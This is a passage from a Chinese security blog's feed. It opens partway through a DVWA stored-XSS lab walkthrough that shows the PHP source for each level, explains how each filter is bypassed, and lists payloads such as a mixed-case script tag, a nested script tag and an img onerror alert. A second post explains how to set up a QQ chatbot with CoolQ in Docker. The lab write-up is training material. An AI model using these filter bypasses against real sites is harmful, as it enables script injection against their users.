is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h5><p>对name用str_replace()是区分大小写的，可以大写绕过，只是匹配了一次可以嵌套绕过，也可以使用其他的标签<br>对message，addslashes()函数在预定字符加/，strip_tags()函数剥去字符串中HTML，XML，以及php标签，htmlspecialchars()函数预定的函数转换为HTML实体，基本都过滤和转义了，所以突破name变量，name变量限制了输出长度，要F12更改name的maxlength<br><img src="https://Lmg66.github.io/img/127.png" alt="图片"><br><img src="https://Lmg66.github.io/img/128.png" alt="图片"><br><img src="https://Lmg66.github.io/img/129.png" alt="图片"><br><img src="https://Lmg66.github.io/img/130.png" alt="图片"></p><h5 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;s&lt;script&gt;cript&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="级别-high-2"><a href="#级别-high-2" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-10"><a href="#查看源码-10" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h5><p>对message和上一个一样，没希望突破，对name来说preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name )之前反射型xss见过，不区分大小写，通配符过滤，可以使用其他标签,name同样限制了长度，F12改一下maxlength=”100”</p><h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="级别-impossible-2"><a href="#级别-impossible-2" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-11"><a href="#查看源码-11" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h5><p>对name和message都进行了严格过滤</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;DVWA靶场都不陌生，最新学习xss，从新又搞了一遍xss部分，从源码方面康康xss的原因，参考了很多大佬的博客表示感谢&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
    
      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>qq机器人</title>
    <link href="https://lnng.top/posts/e895.html"/>
    <id>https://lnng.top/posts/e895.html</id>
    <published>2020-06-30T09:54:54.000Z</published>
    <updated>2020-07-16T04:29:22.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>在其他群看见qq机器人很好玩，就打算自己做一个，想让其推送网站的文章，方便阅读</p><h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>为了让qq机器人能24小时运行建议搭建在服务器上或者vps上</p><p>手里刚好有个服务器我就搭建在服务器上了</p><p>服务器环境：centos7</p><h2 id="准备配置环境"><a href="#准备配置环境" class="headerlink" title="准备配置环境"></a>准备配置环境</h2><h3 id="安装宝塔"><a href="#安装宝塔" class="headerlink" title="安装宝塔"></a>安装宝塔</h3><p>因为是centos系统没有图形化页面，个人建议安装宝塔(如果你Linux命令很熟悉可以跳过)</p><p>安装方法：<a href="https://www.bt.cn/bbs/thread-19376-1-1.html" target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-19376-1-1.html</a></p><p>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><p>等待一会终端出现一个ip地址(就是你服务器的ip+8888好像)和账号密码访问登录到宝塔</p><p>按照我选择的安装插件即可(建议：编译安装)</p><p><img src="https://Lmg66.github.io/img/72.png" alt="图片"></p><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>酷q要运行在docker里</p><h4 id="安装方法一-通过宝塔安装"><a href="#安装方法一-通过宝塔安装" class="headerlink" title="安装方法一(通过宝塔安装)"></a>安装方法一(通过宝塔安装)</h4><p>宝塔页面软件商城搜索docker，安装即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h4 id="安装方法二-命令行安装"><a href="#安装方法二-命令行安装" class="headerlink" title="安装方法二(命令行安装)"></a>安装方法二(命令行安装)</h4><p>安装方法：<a href="https://www.runoob.com/docker/centos-docker-install.html" target="_blank" rel="noopener">https://www.runoob.com/docker/centos-docker-install.html</a><br>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><h3 id="安装python3-gt-3-7"><a href="#安装python3-gt-3-7" class="headerlink" title="安装python3&gt;=3.7"></a>安装python3&gt;=3.7</h3><p>因为酷q中的cqhttp插件需要python3环境这里顺便安装了</p><p>安装方法(centos7系统)：<a href="https://blog.csdn.net/u013214212/article/details/81540840" target="_blank" rel="noopener">https://blog.csdn.net/u013214212/article/details/81540840</a></p><p>注意：有的系统自带的有python2或者python3，建议百度按照自己系统安装或升级python3.7以上的方法</p><h2 id="安装酷q"><a href="#安装酷q" class="headerlink" title="安装酷q"></a>安装酷q</h2><p>终端命令pull 酷Q的镜像：</p><pre><code>docker pull coolq/wine-coolq</code></pre><p>如果拉取镜像比较慢，可以尝试换源</p><p>换源参考文章：<a href="https://www.cnblogs.com/Neeo/articles/12726262.html" target="_blank" rel="noopener">https://www.cnblogs.com/Neeo/articles/12726262.html</a></p><p>创建用于存放coolQ数据的文件夹：</p><pre><code>mkdir /root/coolq-data</code></pre><p>然后运行 酷 Q 镜像：</p><pre><code>docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq</code></pre><p>其中 VNC_PASSWD 指定链接 VNC 密码，远程访问酷 Q 界面时要用到，COOLQ_ACCOUNT 指的是酷 Q 默认登录密码</p><p>登录酷 Q 界面，在浏览器输入你服务器ip+9000，访问输入 vnc 密码后就可以看到酷 Q 登录界面了</p><h3 id="docker的酷q的运维"><a href="#docker的酷q的运维" class="headerlink" title="docker的酷q的运维"></a>docker的酷q的运维</h3><h4 id="方法一-命令行-："><a href="#方法一-命令行-：" class="headerlink" title="方法一(命令行)："></a>方法一(命令行)：</h4><p>查看酷 Q 运行情况，主要是酷 Q 运行中产生的日志，可以用来排错</p><pre><code>docker logs coolq</code></pre><p>启动和停止酷 Q</p><pre><code>docker start coolqdocker stop coolq</code></pre><h4 id="方法二-宝塔"><a href="#方法二-宝塔" class="headerlink" title="方法二(宝塔):"></a>方法二(宝塔):</h4><p>docker管理器即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h2 id="安装nonebot-cqhttp-个性化定制你的qq机器人"><a href="#安装nonebot-cqhttp-个性化定制你的qq机器人" class="headerlink" title="安装nonebot cqhttp 个性化定制你的qq机器人"></a>安装nonebot cqhttp 个性化定制你的qq机器人</h2><p>参考nonebot官网:<a href="https://nonebot.cqp.moe/" target="_blank" rel="noopener">https://nonebot.cqp.moe/</a></p><p>注：官网是最好的教程</p><h2 id="挂起脚本，实现24小时运行"><a href="#挂起脚本，实现24小时运行" class="headerlink" title="挂起脚本，实现24小时运行"></a>挂起脚本，实现24小时运行</h2><p>ssh连接，断开的时候，python脚本也会断开，解决这个问题需要将脚本后台挂起</p><p>进入程序入口，挂起命令</p><pre><code>nohup python bot.py &amp;</code></pre><p>然后回车即可，会看见一个id，就是后台运行id,若要关掉需要使用</p><pre><code>ps -aux</code></pre><p>可以找到你运行的进程id，然后用命令关掉</p><pre><code>kill id</code></pre><h2 id="个人qq机器人-已经开源"><a href="#个人qq机器人-已经开源" class="headerlink" title="个人qq机器人(已经开源)"></a>个人qq机器人(已经开源)</h2><p>开源地址:<a href="https://github.com/Lmg66/QQrobot" target="_blank" rel="noopener">https://github.com/Lmg66/QQrobot</a></p><p>实现的功能</p><p> 1.天气，食用方法”小安+天气” </p><pre><code>文件目录：plugins/weather</code></pre><p> 2.图灵对话，食用方+你想说的话” </p><pre><code> plugins/tuling.py</code></pre><p> 3.信息的获取，食用方法”小安+碧蓝航线”还可以+知乎+steam+新番+<em>年</em>月有什么新番+先知社区 </p><pre><code> plugins下看文件的命名基本都是功能</code></pre><p> 4.游戏功能,食用方法”小安+谁是卧底”—-&gt;测试ing  </p><p> 5.以图搜番，食用方法”小安+以图搜番”</p><pre><code>  plugins/anime_search_photo.py</code></pre><p> 6.音乐功能,食用方法”小安+来首”——&gt;此处有bug不建议食用会让小安卡住 </p><pre><code> plugins/musice</code></pre><p> 7.早安，午安，晚安  </p><pre><code> plugins/one_talk</code></pre><p> 还有隐藏功能哦，不妨输入”小安+来个涩图”试试有惊喜哦，嘻嘻嘻’)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h2&gt;&lt;p&gt;在其他群看见qq机器人很好玩，就打算自己做一个，想让其推送网站的文章，方便阅读&lt;/p&gt;
&lt;h2 id=&quot;所需环境&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="qq机器人" scheme="https://lnng.top/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
    
      <category term="qq机器人的搭建" scheme="https://lnng.top/tags/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
